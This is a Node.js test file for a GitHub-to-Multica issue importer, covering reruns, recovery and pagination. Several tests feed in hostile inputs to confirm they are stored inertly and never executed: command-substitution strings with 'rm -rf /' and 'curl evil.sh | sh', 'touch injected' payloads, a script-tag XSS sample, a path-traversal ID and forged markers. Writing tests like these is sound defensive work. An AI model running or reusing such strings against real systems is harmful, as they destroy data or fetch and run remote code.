import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { mkdtemp, rm, writeFile, chmod, readFile, access } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { importEvent, main, fetchIssueComments, createCommandRunner } from './github-import.mjs';

const flag = (args, name) => args[args.indexOf(name) + 1];

function createFakeMultica({ failMetadataOnce = false } = {}) {
  const issues = [];
  const calls = [];
  const writtenFiles = [];
  let nextId = 1;
  let metadataArmed = failMetadataOnce;

  const read = (args, name) => {
    const file = flag(args, name);
    writtenFiles.push({ file, content: readFileSync(file, 'utf8') });
    return readFileSync(file, 'utf8');
  };

  const run = async (args) => {
    calls.push(args);
    const [, area, group, action, ...rest] = args;
    const emit = (value) => ({ stdout: JSON.stringify(value), stderr: '' });

    if (area === 'issue' && group === 'list') {
      const key = flag(args, '--metadata').split('=').slice(1).join('=');
      return emit({ issues: issues.filter((issue) => issue.metadata.github_issue_key === key) });
    }
    if (area === 'issue' && group === 'search') {
      return emit({ issues: issues.filter((issue) => issue.description.includes(action)).slice(0, Math.min(50, Number(flag(args, '--limit')))) });
    }
    if (area === 'issue' && group === 'get') {
      return emit(issues.find((issue) => issue.id === action));
    }
    if (area === 'issue' && group === 'create') {
      const issue = {
        id: `issue-${nextId}`,
        identifier: `FAKE-${nextId++}`,
        title: flag(args, '--title'),
        description: read(args, '--description-file'),
        status: flag(args, '--status'),
        assignee_id: args.includes('--assignee') ? flag(args, '--assignee') : null,
        project_id: flag(args, '--project') ?? null,
        metadata: {},
        comments: [],
      };
      issues.push(issue);
      return emit(issue);
    }
    if (area === 'issue' && group === 'metadata' && action === 'set') {
      if (metadataArmed) {
        metadataArmed = false;
        throw new Error('metadata write failed');
      }
      const issue = issues.find((candidate) => candidate.id === rest[0]);
      issue.metadata[flag(args, '--key')] = flag(args, '--value');
      return emit({});
    }
    if (area === 'issue' && group === 'comment' && action === 'list') {
      return emit(issues.find((issue) => issue.id === rest[0]).comments);
    }
    if (area === 'issue' && group === 'comment' && action === 'add') {
      const issue = issues.find((candidate) => candidate.id === rest[0]);
      issue.comments.push({ id: `comment-${issue.comments.length + 1}`, content: read(args, '--content-file') });
      return emit({ id: `comment-${issue.comments.length}` });
    }
    throw new Error(`unexpected command: ${args.join(' ')}`);
  };

  return { run, issues, calls, writtenFiles, failNextMetadataWrite: () => { metadataArmed = true; } };
}

function createFakeFetch(comments) {
  const calls = [];
  const httpFetch = async (url) => {
    calls.push(url);
    const page = Number(new URL(url).searchParams.get('page'));
    const start = (page - 1) * 100;
    return { ok: true, status: 200, json: async () => comments.slice(start, start + 100) };
  };
  return { httpFetch, calls };
}

const githubIssue = (overrides = {}) => ({
  id: 1001,
  number: 42,
  title: 'Importer drops the middle comment',
  body: 'Steps to reproduce.',
  html_url: 'https://github.com/Humanive/Learn/issues/42',
  user: { login: 'octocat' },
  ...overrides,
});

const githubComment = (id, body, overrides = {}) => ({
  id,
  body,
  created_at: '2026-10-01T00:00:00Z',
  html_url: `https://github.com/Humanive/Learn/issues/42#issuecomment-${id}`,
  user: { login: 'octocat' },
  ...overrides,
});

const openedPayload = (issue = githubIssue()) => ({
  action: 'opened',
  issue,
  repository: { full_name: 'Humanive/Learn' },
});

const commentPayload = (comment, issue = githubIssue(), extra = {}) => ({
  action: 'created',
  comment,
  issue,
  repository: { full_name: 'Humanive/Learn' },
  ...extra,
});

async function withWorkdir(run) {
  const cwd = await mkdtemp(path.join(os.tmpdir(), 'github-import-test-'));
  try {
    return await run(cwd);
  } finally {
    await rm(cwd, { recursive: true, force: true });
  }
}

test('imports a new GitHub issue as an unassigned todo issue', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent({ eventName: 'issues', payload: openedPayload() }, {
      run: multica.run, fetch: httpFetch, cwd,
    });

    assert.equal(result.status, 'issue created');
    assert.equal(multica.issues.length, 1);
    const [issue] = multica.issues;
    assert.equal(issue.title, 'Importer drops the middle comment');
    assert.equal(issue.status, 'todo');
    assert.equal(issue.assignee_id, null);
    assert.equal(issue.metadata.github_issue_key, 'Humanive/Learn#42');
    assert.match(issue.description, /^```text\nSteps to reproduce\.\n```$/m);
    assert.match(issue.description, /^github-source:Humanive\/Learn#42$/m);
    assert.match(issue.description, /^GitHub issue: Humanive\/Learn#42 \(id 1001\)$/m);
    assert.match(issue.description, /^Source: https:\/\/github\.com\/Humanive\/Learn\/issues\/42$/m);
    assert.equal(issue.metadata.github_issue_id, '1001');
  });
});

test('a rerun of the same issue event creates nothing', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    const second = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });

    assert.equal(second.status, 'up to date');
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].comments.length, 0);
  });
});

test('a rerun after the metadata write failed recovers the created issue', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    multica.failNextMetadataWrite();
    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }));
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, undefined);

    const recovered = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });

    assert.equal(recovered.status, 'issue metadata recovered');
    assert.equal(multica.issues.length, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, 'Humanive/Learn#42');
  });
});

for (const count of [49, 50, 51]) {
  test(`recovery search with ${count} candidates ${count < 50 ? 'recovers the issue' : 'fails before inspecting or writing issues'}`, async () => {
    await withWorkdir(async (cwd) => {
      const multica = createFakeMultica();
      const deps = { run: multica.run, fetch: createFakeFetch([]).httpFetch, cwd };
      multica.issues.push(...Array.from({ length: count }, (_, i) => ({
        id: `candidate-${i}`,
        description: i === 48 || i === 50 ? 'github-source:Humanive/Learn#42' : 'github-source:Humanive/Learn#420',
        metadata: {},
        comments: [],
      })));
      const event = { eventName: 'issues', payload: openedPayload() };

      if (count < 50) {
        const result = await importEvent(event, deps);
        assert.equal(result.status, 'issue metadata recovered');
        assert.equal(multica.issues.length, 49);
        assert.deepEqual(multica.issues[48].metadata, {
          github_issue_key: 'Humanive/Learn#42', github_issue_id: '1001',
        });
      } else {
        const before = structuredClone(multica.issues);
        await assert.rejects(importEvent(event, deps), /recovery search reached its result cap/);
        assert.deepEqual(multica.issues, before);
        assert.deepEqual(multica.calls.map((args) => args[2]), ['list', 'search']);
      }
      const search = multica.calls.find((args) => args[2] === 'search');
      assert.equal(flag(search, '--limit'), '50');
    });
  });
}

test('description recovery rejects a conflicting immutable GitHub issue ID without writes', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    multica.issues.push({
      id: 'existing',
      description: 'github-source:Humanive/Learn#42',
      metadata: { github_issue_id: '9999' },
      comments: [],
    });
    const before = structuredClone(multica.issues);
    await assert.rejects(importEvent({ eventName: 'issues', payload: openedPayload() }, {
      run: multica.run, fetch: createFakeFetch([]).httpFetch, cwd,
    }), /source issue ID differs from the existing Multica mapping/);
    assert.deepEqual(multica.issues, before);
    assert.deepEqual(multica.calls.map((args) => args[2]), ['list', 'search', 'get']);
  });
});

test('imports overlapping GitHub comment pages once and skips them on a rerun', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comments = Array.from({ length: 101 }, (_, i) => githubComment(i + 1, `comment ${i + 1}`));
    const { httpFetch, calls } = createFakeFetch([...comments.slice(0, 100), ...comments.slice(99)]);
    const event = { eventName: 'issue_comment', payload: commentPayload(comments[100]) };
    const deps = { run: multica.run, fetch: httpFetch, cwd };

    const first = await importEvent(event, deps);
    assert.equal(first.comments, 101);
    assert.equal(calls.length, 2);
    assert.equal(multica.issues[0].comments.length, 101);
    assert.equal(multica.issues[0].comments.filter((comment) =>
      comment.content.includes('\ngithub-comment:Humanive/Learn#42/100\n')).length, 1);

    const second = await importEvent(event, deps);
    assert.equal(second.comments, 0);
    assert.equal(multica.issues[0].comments.length, 101);
  });
});

test('a rerun after an unknown comment write result imports only the remaining comment', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comments = [githubComment(1, 'one'), githubComment(2, 'two')];
    const deps = { run: multica.run, fetch: createFakeFetch(comments).httpFetch, cwd };
    const event = { eventName: 'issue_comment', payload: commentPayload(comments[1]) };
    let failOnce = true;
    const run = async (args) => {
      const result = await multica.run(args);
      if (failOnce && args[2] === 'comment' && args[3] === 'add') {
        failOnce = false;
        throw new Error('comment write result lost');
      }
      return result;
    };

    await assert.rejects(importEvent(event, { ...deps, run }), /comment write result lost/);
    assert.equal(multica.issues[0].comments.length, 1);

    const result = await importEvent(event, deps);
    assert.equal(result.comments, 1);
    assert.deepEqual(
      multica.issues[0].comments.map((comment) => comment.content.match(/^github-comment:.*\/(\d+)$/m)[1]),
      ['1', '2'],
    );
    assert.equal((await importEvent(event, deps)).comments, 0);
  });
});

test('imports a new comment once and skips it on a rerun', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(1, 'Confirmed on Linux.');
    const { httpFetch } = createFakeFetch([comment]);
    const event = { eventName: 'issue_comment', payload: commentPayload(comment) };

    const first = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    assert.equal(first.comments, 1);

    const second = await importEvent(event, { run: multica.run, fetch: httpFetch, cwd });
    assert.equal(second.comments, 0);

    assert.equal(multica.issues[0].comments.length, 1);
    const [imported] = multica.issues[0].comments;
    assert.match(imported.content, /^github-comment:Humanive\/Learn#42\/1$/m);
    assert.match(imported.content, /^```text\nConfirmed on Linux\.\n```$/m);
    assert.equal(imported.content.split('\n')[0].split(/\s/)[0], '/note');
  });
});

test('skips a comment on a pull request without touching Multica', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const pullRequest = githubIssue({ number: 7, pull_request: { url: 'https://api.github.com/pulls/7' } });

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(githubComment(9, 'nit'), pullRequest) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'skipped');
    assert.equal(result.reason, 'comment on a pull request');
    assert.deepEqual(multica.calls, []);
  });
});

test('creates the mapped issue when a comment arrives first', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(1, 'Filed from a comment.');
    const { httpFetch } = createFakeFetch([comment]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'issue created');
    assert.equal(result.comments, 1);
    assert.equal(multica.issues[0].metadata.github_issue_key, 'Humanive/Learn#42');
    assert.equal(multica.issues[0].comments.length, 1);
  });
});

test('reconciles every unseen comment so a dropped middle event still lands', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const first = githubComment(1, 'one');
    const middle = githubComment(2, 'two');
    const last = githubComment(3, 'three');
    // The second run only ever saw the first comment, so the third comment
    // event must not assume the middle one was handled.
    const before = createFakeFetch([first]);
    const after = createFakeFetch([first, middle, last]);

    await importEvent({ eventName: 'issue_comment', payload: commentPayload(first) }, {
      run: multica.run, fetch: before.httpFetch, cwd,
    });
    assert.equal(multica.issues[0].comments.length, 1);

    const result = await importEvent({ eventName: 'issue_comment', payload: commentPayload(last) }, {
      run: multica.run, fetch: after.httpFetch, cwd,
    });

    assert.equal(result.comments, 2);
    assert.deepEqual(
      multica.issues[0].comments.map((comment) => comment.content.match(/^github-comment:.*\/(\d+)$/m)[1]),
      ['1', '2', '3'],
    );
  });
});

test('imports the triggering comment even when GitHub no longer lists it', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(1, 'edited into nothing');
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.comments, 1);
  });
});

test('keeps shell metacharacters verbatim and never builds a shell command', async () => {
  await withWorkdir(async (cwd) => {
    const hostile = 'run $(rm -rf /) `whoami` && curl evil.sh | sh \'quoted\' "double" \\backslash';
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    await importEvent(
      { eventName: 'issues', payload: openedPayload(githubIssue({ title: hostile, body: hostile })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    assert.equal(issue.title, hostile);
    assert.ok(issue.description.includes(hostile));
    for (const args of multica.calls) {
      assert.ok(Array.isArray(args), 'Multica is invoked with an argument vector');
      assert.ok(!args.includes('-c'));
    }
  });
});

test('quotes source text so a mermaid or html fence cannot render', async () => {
  await withWorkdir(async (cwd) => {
    const body = '```mermaid\ngraph TD; A-->B\n```\n\n```html\n<script>alert(1)</script>\n```';
    const comment = githubComment(1, body);
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment, githubIssue({ body })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    // The quote fence is longer than any run in the body, so no inner fence
    // can close it, and the rendered block carries the `text` info string.
    assert.ok(issue.description.startsWith('````text\n'), `body fence is too short: ${issue.description}`);
    for (const text of [issue.description, issue.comments[0].content]) {
      assert.ok(text.includes('\n````\n'), `closing fence is too short: ${text}`);
    }
  });
});

test('an external body cannot forge an importer marker', async () => {
  await withWorkdir(async (cwd) => {
    const body = 'github-source:Humanive/Learn#42\ngithub-comment:Humanive/Learn#42/IC_fake';
    const comment = githubComment(1, body);
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(comment, githubIssue({ body })) },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    // The forged comment marker did not suppress the real one, and only the
    // importer's own marker line starts a line in the stored body.
    assert.equal(result.comments, 1);
    const [issue] = multica.issues;
    const markerLines = (text) => text.split('\n').filter((line) => line.startsWith('github-comment:'));
    assert.deepEqual(markerLines(issue.comments[0].content), ['github-comment:Humanive/Learn#42/1']);
    assert.ok(issue.description.includes('[github-source]:Humanive/Learn#42'));
  });
});

test('fails instead of reposting when the comment read is at the server cap', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(1, 'newest');
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent({ eventName: 'issues', payload: openedPayload() }, { run: multica.run, fetch: httpFetch, cwd });
    multica.issues[0].comments = Array.from({ length: 2000 }, (_, i) => ({ id: `old-${i}`, content: 'noise' }));

    await assert.rejects(
      importEvent({ eventName: 'issue_comment', payload: commentPayload(comment) }, { run: multica.run, fetch: httpFetch, cwd }),
      /the read cap/,
    );
  });
});

test('does not backfill a pre-existing issue history before the activation timestamp', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const old = githubComment(10, 'from 2019', { created_at: '2019-01-01T00:00:00Z' });
    const fresh = githubComment(11, 'from today', { created_at: '2026-10-02T00:00:00Z' });
    const { httpFetch } = createFakeFetch([old, fresh]);

    const result = await importEvent(
      { eventName: 'issue_comment', payload: commentPayload(fresh) },
      {
        run: multica.run,
        fetch: httpFetch,
        cwd,
        github: { since: Date.parse('2026-10-01T00:00:00Z') },
      },
    );

    assert.equal(result.comments, 1);
    assert.deepEqual(
      multica.issues[0].comments.map((comment) => comment.content.match(/^github-comment:.*\/(\d+)$/m)[1]),
      ['11'],
    );
  });
});

test('fails rather than guessing when two issues claim the same source', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);
    const event = { eventName: 'issues', payload: openedPayload() };

    multica.failNextMetadataWrite();
    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }));
    // A human re-ran the import and produced a second copy of the same issue.
    const duplicate = { ...multica.issues[0], id: 'issue-duplicate', identifier: 'FAKE-DUP' };
    multica.issues.push(duplicate);

    await assert.rejects(importEvent(event, { run: multica.run, fetch: httpFetch, cwd }), /2 Multica issues/);
  });
});

test('neutralizes agent mentions and at-handles in imported text', async () => {
  await withWorkdir(async (cwd) => {
    const body = 'ping [@Mika](mention://agent/a202af32-ae60-4e58-be3d-e23ffeb056e3) and [@Ops](mention://squad/1) about @octocat';
    const comment = githubComment(1, body, { user: { login: 'mention://agent/a202af32' } });
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent(
      {
        eventName: 'issue_comment',
        payload: commentPayload(comment, githubIssue({ title: 'mention://agent/a202af32 test @here', body })),
      },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    const [issue] = multica.issues;
    for (const text of [issue.title, issue.description, issue.comments[0].content]) {
      assert.ok(!text.includes('mention://'), `mention scheme survived: ${text}`);
      assert.ok(!text.includes('@'), `at-handle survived: ${text}`);
      assert.ok(text.includes('mention+'));
    }
  });
});

test('skips issue actions other than opening', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const { httpFetch } = createFakeFetch([]);

    const result = await importEvent(
      { eventName: 'issues', payload: { ...openedPayload(), action: 'closed' } },
      { run: multica.run, fetch: httpFetch, cwd },
    );

    assert.equal(result.status, 'skipped');
    assert.deepEqual(multica.calls, []);
  });
});

test('hands Multica body files that live inside the working directory', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(1, 'persisted');
    const { httpFetch } = createFakeFetch([comment]);

    await importEvent({ eventName: 'issue_comment', payload: commentPayload(comment) }, {
      run: multica.run, fetch: httpFetch, cwd,
    });

    assert.ok(multica.writtenFiles.length >= 2);
    for (const { file, content } of multica.writtenFiles) {
      assert.ok(path.resolve(file).startsWith(`${path.resolve(cwd)}${path.sep}`), `${file} escapes ${cwd}`);
      assert.ok(content.length > 0);
    }
  });
});


test('the Actions entry point imports its event file and passes GitHub authentication', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const eventPath = path.join(cwd, 'event.json');
    const comment = githubComment(21, 'entry point');
    await writeFile(eventPath, JSON.stringify(commentPayload(comment)));
    let requested = false;
    const result = await main({
      cwd,
      env: {
        GITHUB_EVENT_PATH: eventPath,
        GITHUB_EVENT_NAME: 'issue_comment',
        GITHUB_TOKEN: 'fixture-token',
        MULTICA_TOKEN: 'mul_fixture',
        MULTICA_SERVER_URL: 'https://api.example.test',
        MULTICA_WORKSPACE_ID: 'workspace-fixture',
        MULTICA_IMPORT_SINCE: '2026-10-01T00:00:00Z',
      },
      run: multica.run,
      httpFetch: async (url, options) => {
        requested = true;
        assert.equal(new URL(url).pathname, '/repos/Humanive/Learn/issues/42/comments');
        assert.equal(options.headers.authorization, 'Bearer fixture-token');
        return { ok: true, json: async () => [comment] };
      },
    });
    assert.equal(requested, true);
    assert.equal(result.comments, 1);
    assert.equal(multica.issues.length, 1);
  });
});

test('rejects malformed supported events before any Multica write', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    await assert.rejects(importEvent({
      eventName: 'issue_comment', payload: commentPayload({ id: '../escape' }),
    }, { run: multica.run, fetch: createFakeFetch([]).httpFetch, cwd }), /invalid GitHub comment/);
    assert.deepEqual(multica.calls, []);
  });
});

test('different issue numbers with the same title create separate tasks', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const deps = { run: multica.run, fetch: createFakeFetch([]).httpFetch, cwd };
    await importEvent({ eventName: 'issues', payload: openedPayload() }, deps);
    await importEvent({ eventName: 'issues', payload: openedPayload(githubIssue({ number: 420, id: 1002 })) }, deps);
    assert.equal(multica.issues.length, 2);
    assert.equal(multica.issues[1].metadata.github_issue_key, 'Humanive/Learn#420');
    assert.ok(multica.calls.filter((args) => args[2] === 'create').every((args) => args.includes('--allow-duplicate')));
  });
});

test('recovery does not confuse issue 42 with issue 420', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const deps = { run: multica.run, fetch: createFakeFetch([]).httpFetch, cwd };
    multica.failNextMetadataWrite();
    await assert.rejects(importEvent({ eventName: 'issues', payload: openedPayload(githubIssue({ number: 420, id: 1002 })) }, deps));
    await importEvent({ eventName: 'issues', payload: openedPayload() }, deps);
    assert.equal(multica.issues.length, 2);
    assert.equal(multica.issues[1].metadata.github_issue_key, 'Humanive/Learn#42');
  });
});

test('adds inert comments to a done issue without overwriting human edits', async () => {
  await withWorkdir(async (cwd) => {
    const multica = createFakeMultica();
    const comment = githubComment(31, 'new comment');
    const deps = { run: multica.run, fetch: createFakeFetch([comment]).httpFetch, cwd };
    await importEvent({ eventName: 'issues', payload: openedPayload() }, { ...deps, fetch: createFakeFetch([]).httpFetch });
    Object.assign(multica.issues[0], { status: 'done', title: 'Human title', description: 'Human description', assignee_id: 'agent-id' });
    await importEvent({ eventName: 'issue_comment', payload: commentPayload(comment) }, deps);
    const issue = multica.issues[0];
    assert.equal(issue.status, 'done');
    assert.equal(issue.title, 'Human title');
    assert.equal(issue.description, 'Human description');
    assert.equal(issue.assignee_id, 'agent-id');
    assert.ok(issue.comments[0].content.startsWith('/note '));
  });
});

test('reconciles paginated GitHub comments and fails at the safety cap', async () => {
  const comments = Array.from({ length: 101 }, (_, i) => githubComment(i + 1, 'comment'));
  const normal = createFakeFetch(comments);
  const fetched = await fetchIssueComments(normal.httpFetch, { repository: 'Humanive/Learn', number: 42 });
  assert.equal(fetched.length, 101);
  assert.equal(normal.calls.length, 2);
  await assert.rejects(fetchIssueComments(async () => ({ ok: true, json: async () => comments.slice(0, 100) }), {
    repository: 'Humanive/Learn', number: 42,
  }), /pagination exceeded/);
});


test('runs the real process adapter with literal arguments and separate stderr', async () => {
  await withWorkdir(async (cwd) => {
    const executable = path.join(cwd, 'fake-cli');
    await writeFile(executable, `#!${process.execPath}\nconsole.log(JSON.stringify(process.argv.slice(2))); console.error('fixture warning');`);
    await chmod(executable, 0o755);
    const hostile = '$(touch injected) `touch injected` ; touch injected';
    const result = await createCommandRunner({ cwd })([executable, hostile]);
    assert.deepEqual(JSON.parse(result.stdout), [hostile]);
    assert.equal(result.stderr.trim(), 'fixture warning');
    await assert.rejects(access(path.join(cwd, 'injected')));
  });
});
